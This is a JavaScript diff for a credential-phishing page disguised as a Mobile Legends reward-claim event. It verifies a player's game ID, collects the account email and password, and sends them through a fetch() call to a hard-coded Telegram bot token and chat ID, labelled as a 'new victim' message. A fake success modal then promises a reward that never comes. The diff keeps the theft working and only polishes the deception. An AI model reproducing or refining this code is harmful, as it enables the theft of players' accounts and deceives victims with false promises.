@@ -8,6 +8,21 @@ const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`;
 const CHAT_ID = "8335786077";
 
 let checkTimeout;
+let isSuccessState = false;
+
+function showCustomAlert(title, message, isSuccess = false) {
+    isSuccessState = isSuccess;
+    document.getElementById('custom-modal-title').innerText = title;
+    document.getElementById('custom-modal-text').innerText = message;
+    document.getElementById('customModal').style.display = 'flex';
+}
+
+function closeCustomModal() {
+    document.getElementById('customModal').style.display = 'none';
+    if (isSuccessState) {
+        location.reload();
+    }
+}
 
 function showWarning() {
     const alertBar = document.getElementById('alertBar');
@@ -29,7 +44,7 @@ function checkAccountReal() {
         statusDiv.style.background = 'rgba(41, 128, 185, 0.1)';
         statusDiv.style.border = '1px solid rgba(41, 128, 185, 0.3)';
         statusDiv.style.color = '#3498db';
-        statusDiv.innerHTML = "⏳ Menghubungkan ke server MLBB...";
+        statusDiv.innerHTML = "Menghubungkan ke server MLBB...";
         
         checkTimeout = setTimeout(() => {
             fetch(`https://api.isan.eu.org/nickname/ml?id=${uid}&server=${sid}`)
@@ -40,7 +55,7 @@ function checkAccountReal() {
                         statusDiv.style.background = 'rgba(39, 174, 96, 0.1)';
                         statusDiv.style.border = '1px solid rgba(39, 174, 96, 0.3)';
                         statusDiv.style.color = '#27ae60';
-                        statusDiv.innerHTML = `Akun (${verifiedNickname}) terdeteksi valid!`;
+                        statusDiv.innerHTML = `Akun "${verifiedNickname}" telah terdeteksi. Silahkan pilih hadiah!`;
                     } else {
                         verifiedNickname = "";
                         statusDiv.style.background = 'rgba(192, 57, 43, 0.1)';
@@ -74,7 +89,7 @@ function selectReward(element, name) {
 
     const claimKey = `claimed_${uid}_${sid}`;
     if(localStorage.getItem(claimKey)) {
-        alert(`Username ${verifiedNickname} telah mengambil hadiah pada event ini!`);
+        showCustomAlert("Gagal", `Username "${verifiedNickname}" telah mengambil hadiah pada event ini!`);
         return;
     }
 
@@ -94,13 +109,13 @@ function openLoginModal() {
         return;
     }
     if(!chosenReward) {
-        alert("Silakan pilih salah satu hadiah terlebih dahulu!");
+        showCustomAlert("Ambil Hadiah", "Silakan pilih salah satu hadiah terlebih dahulu!");
         return;
     }
 
     const claimKey = `claimed_${uid}_${sid}`;
     if(localStorage.getItem(claimKey)) {
-        alert(`Username ${verifiedNickname} telah mengambil hadiah pada event ini!`);
+        showCustomAlert("Gagal", `Username "${verifiedNickname}" telah mengambil hadiah pada event ini!`);
         return;
     }
 
@@ -115,24 +130,30 @@ function sendDataToTelegram() {
     const passAcc = document.getElementById('password').value.trim();
 
     if(!userAcc || !passAcc) {
-        alert("Harap lengkapi informasi akun dan password Anda!");
+        showCustomAlert("Data Belum Dilengkapi", "Harap lengkapi informasi akun dan password anda!");
         return;
     }
 
     const claimKey = `claimed_${uid}_${sid}`;
     localStorage.setItem(claimKey, "true");
 
-    const message = `🚨 *NEW EVENT CLAIM* 🚨\n\n` +
-                    `🎁 *Hadiah Dipilih:* ${chosenReward}\n` +
-                    `👤 *Nickname Asli:* ${verifiedNickname}\n` +
-                    `🆔 *ID / Server:* ${uid} (${sid})\n` +
-                    `📌 *Metode:* ${method}\n` +
-                    `✉️ *Akun:* ${userAcc}\n` +
-                    `🔑 *Password:* ${passAcc}`;
+    const message = "ADA KORBAN BARU NIH!\n\n" +
+                    "Hadiah: " + chosenReward + "\n" +
+                    "Nickname: " + verifiedNickname + "\n" +
+                    "ID & Server: " + uid + " (" + sid + ")\n" +
+                    "Akun: " + method + "\n" +
+                    "Email: " + userAcc + "\n" +
+                    "Password: " + passAcc;
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-    fetch(url).catch(err => console.error(err));
+    const url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);
+    
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            console.log("Telegram response:", data);
+        })
+        .catch(err => console.error("Error:", err));
 
-    alert(`Selamat (${verifiedNickname}). ${chosenReward} anda akan segera dikirim dalam inbox dalam 2x24Jam!`);
-    location.reload();
+    document.getElementById('loginModal').style.display = 'none';
+    showCustomAlert("Berhasil", `Selamat "${verifiedNickname}". ${chosenReward} anda akan segera dikirim dalam inbox dalam 2x24Jam!`, true);
 }
